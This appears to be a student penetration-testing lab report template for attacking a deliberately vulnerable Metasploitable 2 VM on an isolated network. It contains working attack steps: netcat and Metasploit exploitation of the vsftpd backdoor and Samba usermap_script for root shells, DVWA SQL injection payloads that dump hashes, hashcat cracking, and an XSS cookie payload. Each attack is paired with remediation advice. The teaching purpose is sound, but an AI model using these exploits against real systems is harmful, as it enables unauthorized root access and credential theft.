# Lab Report — Attacking Metasploitable 2 from Kali Linux (Step 4)

**Author:** _(your name)_
**Course / Section:** _(fill in)_
**Date:** _(fill in)_
**Environment:** Kali Linux (attacker) and Metasploitable 2 (target) on an isolated
host-only network.

> **Required artifact:** the DVWA login screenshot from Step 3 is embedded in
> §2.1 below. Save it as `screenshots/step3-dvwa-login.png`.

---

## 1. Methodology

Testing followed the standard phases used in a penetration test, scaled to this lab:

1. **Reconnaissance / scanning** — discover the host, open ports, and service versions.
2. **Enumeration** — identify specific vulnerable services and web apps.
3. **Exploitation** — demonstrate one or more attacks that yield access or data.
4. **Analysis & remediation** — explain *why* each weakness exists and how to fix it.

Replace `TARGET` below with your Metasploitable 2 IP (from `ifconfig`), e.g.
`192.168.56.102`. All commands run from the Kali VM.

```bash
TARGET=192.168.56.102   # set to your Metasploitable 2 IP
```

---

## 2. Reconnaissance

### 2.1 DVWA reachable (Step 3 proof)

Browsing to `http://TARGET/dvwa/` from Kali's Firefox and logging in with the
default `admin` / `password` credentials confirms the web stack is live and the
two VMs share the host-only network.

![DVWA login success](screenshots/step3-dvwa-login.png)

*Figure 1 — Successful DVWA login on Metasploitable 2 (default credentials
`admin` / `password`). Capture this on your machine and save to the path above.*

### 2.2 Port and service scan (nmap)

```bash
# Fast full-port TCP scan with version + default scripts
nmap -sV -sC -p- -T4 $TARGET -oN screenshots/nmap-full.txt
```

Metasploitable 2 exposes a large, deliberately vulnerable attack surface. A typical
scan shows services such as:

| Port | Service | Notable issue |
|------|---------|---------------|
| 21/tcp  | vsftpd 2.3.4 | Backdoored version (CVE-2011-2523) |
| 22/tcp  | OpenSSH 4.7p1 | Weak/old; brute-forceable accounts |
| 23/tcp  | telnet | Cleartext login; banner leaks creds hint |
| 25/tcp  | Postfix smtpd | User enumeration (VRFY) |
| 80/tcp  | Apache 2.2.8 / PHP 5.2.4 | Hosts DVWA, Mutillidae, phpinfo |
| 139,445 | Samba 3.x | `usermap_script` RCE (CVE-2007-2447) |
| 512–514 | r-services | `rexec`/`rlogin`/`rsh` trust abuse |
| 1099 | Java RMI | RMI registry code execution |
| 3306 | MySQL 5.0.51a | Blank/weak root; remote access |
| 5432 | PostgreSQL | Weak creds |
| 5900 | VNC | Password `password` |
| 6667 | UnrealIRCd | Backdoor (CVE-2010-2075) |
| 8180 | Apache Tomcat | Default manager creds |

> Record your own scan output in `screenshots/nmap-full.txt` and reference the exact
> versions you observe — they are what justify each exploit below.

---

## 3. Exploitation (demonstrations)

Below are three representative attacks spanning different vulnerability classes:
a **network service backdoor**, a **service-config RCE**, and a **web-application
injection**. Pick one or more for your writeup; each is self-contained.

### 3.1 vsftpd 2.3.4 backdoor (network service, CVE-2011-2523)

A tampered release of vsftpd 2.3.4 opened a root shell on **port 6200** whenever a
username containing `:)` was submitted.

**Manual demonstration:**
```bash
# Trigger: any username ending in ":)" opens a listener on 6200
nc $TARGET 21
# then type:
USER test:)
PASS test
# in a second terminal:
nc $TARGET 6200
id        # -> uid=0(root) gid=0(root)
```

**Via Metasploit:**
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET
run
# -> command shell as root
```

**Why it works:** a malicious maintainer backdoor shipped in the source tarball.
**Impact:** full root remote code execution, unauthenticated.
**Remediation:** install packages only from verified repositories, verify GPG
signatures/hashes, and keep services patched; vsftpd fixed this immediately.

### 3.2 Samba `usermap_script` command injection (CVE-2007-2447)

Samba 3.0.20–3.0.25rc3 passed the username to `/bin/sh` when a `username map
script` was configured, allowing shell metacharacters in the username to execute
commands as root.

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS TARGET
set LHOST <KALI_IP>      # your Kali host-only IP
run
# -> root shell
id; uname -a
```

**Why it works:** unsanitized user input is interpolated into a shell command.
**Impact:** unauthenticated root RCE over SMB (445).
**Remediation:** patch Samba; never build shell commands from untrusted input;
drop privileges for network daemons.

### 3.3 Web-app injection via DVWA (ties back to Step 3)

With DVWA open and **Security level set to "low"** (DVWA → DVWA Security → Low),
demonstrate two classic web flaws.

**(a) SQL injection** — *SQL Injection* module, User ID field:
```
1' OR '1'='1
```
Returns every user row. Dumping password hashes:
```
1' UNION SELECT user, password FROM users -- -
```
The hashes are unsalted MD5 and crack instantly:
```bash
# save the hash, then:
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# admin -> 5f4dcc3b5aa765d61d8327deb882cf99 -> "password"
```

**(b) Reflected XSS** — *XSS (Reflected)* module, Name field:
```html
<script>alert(document.cookie)</script>
```
The script executes in the browser, proving the input is reflected unescaped and a
session cookie could be stolen.

**Why it works:** user input concatenated into SQL queries / HTML without
parameterization or output encoding.
**Impact:** database exfiltration, credential theft, session hijacking.
**Remediation:** parameterized queries / prepared statements, context-aware output
encoding, a Content-Security-Policy header, and salted password hashing (bcrypt/argon2).

---

## 4. Findings summary

| # | Vulnerability | Vector | Access gained | Severity |
|---|---------------|--------|---------------|----------|
| 1 | vsftpd 2.3.4 backdoor | FTP (21/6200) | root shell | Critical |
| 2 | Samba usermap_script | SMB (445) | root shell | Critical |
| 3 | DVWA SQLi + XSS | HTTP (80) | DB dump, cookie theft | High |

**Root causes observed across the target:** unpatched/backdoored software,
default and weak credentials, cleartext protocols, and missing input
validation/output encoding.

**Top remediations (defensive takeaways):**
- Patch and update; obtain software from trusted, signature-verified sources.
- Remove default accounts; enforce strong, unique credentials; disable unused services.
- Replace cleartext services (telnet, r-services) with encrypted equivalents (SSH).
- Use parameterized queries and output encoding in web apps; add CSP.
- Segment the network and restrict service exposure (least privilege, firewalling).

---

## 5. Appendix — command log

Keep your real terminal output here (or as files under `screenshots/`) so the
report is reproducible:

```
# nmap:        screenshots/nmap-full.txt
# DVWA login:  screenshots/step3-dvwa-login.png
# exploit runs: paste msfconsole / nc transcripts
```
